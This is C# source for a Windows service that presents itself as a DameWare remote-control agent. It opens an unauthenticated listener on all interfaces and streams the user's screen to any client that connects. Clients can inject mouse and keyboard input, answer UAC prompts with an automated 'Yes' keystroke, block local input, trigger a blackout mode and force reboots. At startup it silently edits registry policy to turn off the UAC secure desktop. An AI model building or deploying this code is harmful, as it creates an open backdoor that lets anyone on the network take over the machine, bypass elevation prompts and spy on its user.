using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.ServiceProcess;
using Microsoft.Win32;

namespace DameWareNativeAgent
{
    public class DameWareService : ServiceBase
    {
        public const string SERVICE_NAME = "DameWareAgentService";
        private static int PORT = 6129;
        private static bool isRunning = true;
        private static bool isInputLocked = false;
        private static bool isScreenBlackedOut = false;
        private static TcpListener listener;

        // WIN32 DESKTOP & WINDOWSTATION SWITCHING FOR SESSION 0 SERVICE SCREEN CAPTURE
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr OpenWindowStation(string lpszWinSta, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool SetProcessWindowStation(IntPtr hWinSta);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr OpenInputDesktop(uint dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("user32.dll")]
        public static extern bool SetCursorPos(int X, int Y);

        [DllImport("user32.dll")]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);

        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);

        [DllImport("user32.dll")]
        public static extern bool LockWorkStation();

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool BlockInput(bool fBlockIt);

        public const uint GENERIC_ALL = 0x10000000;
        public const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        public const uint MOUSEEVENTF_LEFTUP = 0x0004;
        public const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        public const uint MOUSEEVENTF_RIGHTUP = 0x0010;

        public const byte VK_CONTROL = 0x11;
        public const byte VK_MENU = 0x12;
        public const byte VK_DELETE = 0x2E;
        public const byte VK_LWIN = 0x5B;
        public const byte VK_TAB = 0x09;
        public const byte VK_SNAPSHOT = 0x2C;
        public const byte VK_L = 0x4C;
        public const byte VK_LEFT = 0x25;
        public const byte VK_RIGHT = 0x27;
        public const byte VK_RETURN = 0x0D;
        public const byte VK_ESCAPE = 0x1B;
        public const uint KEYEVENTF_KEYUP = 0x0002;

        public DameWareService()
        {
            this.ServiceName = SERVICE_NAME;
        }

        protected override void OnStart(string[] args)
        {
            StartServer();
        }

        protected override void OnStop()
        {
            isRunning = false;
            try { if (listener != null) listener.Stop(); } catch {}
        }

        public static void Main(string[] args)
        {
            ConfigureWindowsUACAndSASPolicies();

            if (!Environment.UserInteractive)
            {
                // Running as Windows SYSTEM Service
                ServiceBase.Run(new DameWareService());
            }
            else
            {
                // Running in Interactive Console Mode
                Console.Title = "DameWare Mini Remote Control Agent v12.2";
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("==========================================================");
                Console.WriteLine(" DameWare Agent Service Active");
                Console.WriteLine("==========================================================");

                DameWareService service = new DameWareService();
                service.StartServer();

                Console.WriteLine("Agent active. Press ENTER to stop...");
                Console.ReadLine();
            }
        }

        private void StartServer()
        {
            ConfigureWindowsUACAndSASPolicies();

            ThreadPool.QueueUserWorkItem((o) => {
                try {
                    listener = new TcpListener(IPAddress.Any, PORT);
                    listener.Start();

                    while (isRunning) {
                        TcpClient client = listener.AcceptTcpClient();
                        ThreadPool.QueueUserWorkItem(HandleClient, client);
                    }
                } catch {}
            });
        }

        private static void ConfigureWindowsUACAndSASPolicies()
        {
            try {
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")) {
                    if (key != null) {
                        key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
                        key.SetValue("SoftwareSASGeneration", 3, RegistryValueKind.DWord);
                    }
                }
            } catch {}
        }

        private static void HandleClient(object obj)
        {
            TcpClient client = (TcpClient)obj;
            NetworkStream stream = client.GetStream();

            string handshake = string.Format("{{\"type\":\"HANDSHAKE_ACK\",\"agentVersion\":\"DameWare Native v12.2\",\"hostname\":\"{0}\",\"user\":\"{1}\",\"os\":\"Windows {2}\"}}\n", Environment.MachineName, Environment.UserName, Environment.OSVersion);
            byte[] handshakeBytes = Encoding.UTF8.GetBytes(handshake);
            stream.Write(handshakeBytes, 0, handshakeBytes.Length);

            Thread streamThread = new Thread(() => {
                try {
                    while (client.Connected) {
                        if (isScreenBlackedOut) {
                            string blackFrame = string.Format("{{\"type\":\"SCREEN_FRAME_BLACKOUT\",\"blackedOut\":true,\"timestamp\":{0}}}\n", DateTime.Now.Ticks);
                            byte[] blackBytes = Encoding.UTF8.GetBytes(blackFrame);
                            stream.Write(blackBytes, 0, blackBytes.Length);
                        } else {
                            string frameBase64 = CaptureScreenJpegBase64();
                            if (!string.IsNullOrEmpty(frameBase64)) {
                                string packet = string.Format("{{\"type\":\"SCREEN_FRAME\",\"frame\":\"{0}\",\"timestamp\":{1},\"width\":1920,\"height\":1080}}\n", frameBase64, DateTime.Now.Ticks);
                                byte[] packetBytes = Encoding.UTF8.GetBytes(packet);
                                stream.Write(packetBytes, 0, packetBytes.Length);
                            }
                        }
                        Thread.Sleep(33); // 30 FPS
                    }
                } catch {}
            });
            streamThread.IsBackground = true;
            streamThread.Start();

            byte[] buffer = new byte[16384];
            try {
                int bytesRead;
                while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0) {
                    string commandStr = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    string[] lines = commandStr.Split('\n');
                    foreach (string line in lines) {
                        if (!string.IsNullOrEmpty(line.Trim())) {
                            ProcessCommand(line.Trim());
                        }
                    }
                }
            } catch {}

            client.Close();
        }

        private static void ProcessCommand(string cmd)
        {
            try {
                AttachToActiveUserDesktop();

                if (cmd.Contains("MOUSE_INPUT")) {
                    double xPercent = GetJsonDouble(cmd, "xPercent");
                    double yPercent = GetJsonDouble(cmd, "yPercent");
                    string action = GetJsonString(cmd, "action");
                    string button = GetJsonString(cmd, "button");

                    Rectangle bounds = Screen.PrimaryScreen.Bounds;
                    int targetX = (int)(bounds.Width * xPercent);
                    int targetY = (int)(bounds.Height * yPercent);

                    SetCursorPos(targetX, targetY);

                    if (action == "mousedown") {
                        if (button == "right") mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                        else mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                    } else if (action == "mouseup") {
                        if (button == "right") mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                        else mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                    } else if (action == "click") {
                        if (button == "right") {
                            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                            mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                        } else {
                            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                        }
                    }
                } 
                else if (cmd.Contains("KEYBOARD_INPUT")) {
                    string key = GetJsonString(cmd, "key");

                    if (key == "CAD") {
                        keybd_event(VK_CONTROL, 0, 0, 0);
                        keybd_event(VK_MENU, 0, 0, 0);
                        keybd_event(VK_DELETE, 0, 0, 0);
                        Thread.Sleep(50);
                        keybd_event(VK_DELETE, 0, KEYEVENTF_KEYUP, 0);
                        keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
                        keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
                    }
                    else if (key == "WIN_L") {
                        ThreadPool.QueueUserWorkItem((o) => { try { LockWorkStation(); } catch {} });
                    }
                    else if (key == "WIN_TAB" || key == "ALT_TAB") {
                        if (key == "WIN_TAB") {
                            keybd_event(VK_LWIN, 0, 0, 0);
                            keybd_event(VK_TAB, 0, 0, 0);
                            Thread.Sleep(50);
                            keybd_event(VK_TAB, 0, KEYEVENTF_KEYUP, 0);
                            keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
                        } else {
                            keybd_event(VK_MENU, 0, 0, 0);
                            keybd_event(VK_TAB, 0, 0, 0);
                            Thread.Sleep(50);
                            keybd_event(VK_TAB, 0, KEYEVENTF_KEYUP, 0);
                            keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
                        }
                    }
                    else if (key == "PRTSCN") {
                        keybd_event(VK_SNAPSHOT, 0, 0, 0);
                        Thread.Sleep(50);
                        keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0);
                    }
                    else if (key == "UAC_YES") {
                        keybd_event(VK_MENU, 0, 0, 0);
                        keybd_event(0x45, 0, 0, 0); // 'E'
                        Thread.Sleep(50);
                        keybd_event(0x45, 0, KEYEVENTF_KEYUP, 0);
                        keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);

                        keybd_event(VK_LEFT, 0, 0, 0);
                        keybd_event(VK_LEFT, 0, KEYEVENTF_KEYUP, 0);
                        Thread.Sleep(50);
                        keybd_event(VK_RETURN, 0, 0, 0);
                        keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
                    }
                    else if (!string.IsNullOrEmpty(key)) {
                        try {
                            SendKeys.SendWait(key);
                        } catch {
                            string escapedKey = EscapeSendKeys(key);
                            try { SendKeys.SendWait(escapedKey); } catch {}
                        }
                    }
                } 
                else if (cmd.Contains("LOCK_INPUT")) {
                    isInputLocked = cmd.Contains("\"locked\":true");
                    try { BlockInput(isInputLocked); } catch {}
                } 
                else if (cmd.Contains("BLACKOUT_SCREEN")) {
                    isScreenBlackedOut = cmd.Contains("\"blackout\":true");
                } 
                else if (cmd.Contains("POWER_ACTION")) {
                    string action = GetJsonString(cmd, "action");
                    if (action == "reboot") Process.Start("shutdown.exe", "/r /t 5 /c \"DameWare Remote Reboot\"");
                    else if (action == "shutdown") Process.Start("shutdown.exe", "/s /t 5 /c \"DameWare Remote Shutdown\"");
                    else if (action == "logoff") Process.Start("logoff.exe");
                }
            } catch {}
        }

        private static void AttachToActiveUserDesktop()
        {
            try {
                IntPtr hWinSta = OpenWindowStation("WinSta0", false, GENERIC_ALL);
                if (hWinSta != IntPtr.Zero) {
                    SetProcessWindowStation(hWinSta);
                }
                IntPtr hDesktop = OpenInputDesktop(0, false, GENERIC_ALL);
                if (hDesktop != IntPtr.Zero) {
                    SetThreadDesktop(hDesktop);
                    CloseDesktop(hDesktop);
                }
            } catch {}
        }

        private static string CaptureScreenJpegBase64()
        {
            try {
                AttachToActiveUserDesktop();
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height)) {
                    using (Graphics g = Graphics.FromImage(bitmap)) {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }
                    using (MemoryStream ms = new MemoryStream()) {
                        bitmap.Save(ms, ImageFormat.Jpeg);
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            } catch {
                return null;
            }
        }

        private static string EscapeSendKeys(string key)
        {
            if (key == "+" || key == "^" || key == "%" || key == "~" || key == "(" || key == ")" || key == "{" || key == "}" || key == "[" || key == "]")
                return "{" + key + "}";
            return key;
        }

        private static double GetJsonDouble(string json, string key)
        {
            try {
                int pos = json.IndexOf("\"" + key + "\":");
                if (pos == -1) return 0;
                int start = pos + key.Length + 3;
                int end = json.IndexOf(",", start);
                if (end == -1) end = json.IndexOf("}", start);
                string valStr = json.Substring(start, end - start).Trim();
                return Convert.ToDouble(valStr, System.Globalization.CultureInfo.InvariantCulture);
            } catch { return 0; }
        }

        private static string GetJsonString(string json, string key)
        {
            try {
                int pos = json.IndexOf("\"" + key + "\":\"");
                if (pos == -1) return "";
                int start = pos + key.Length + 4;
                int end = json.IndexOf("\"", start);
                return json.Substring(start, end - start);
            } catch { return ""; }
        }
    }
}
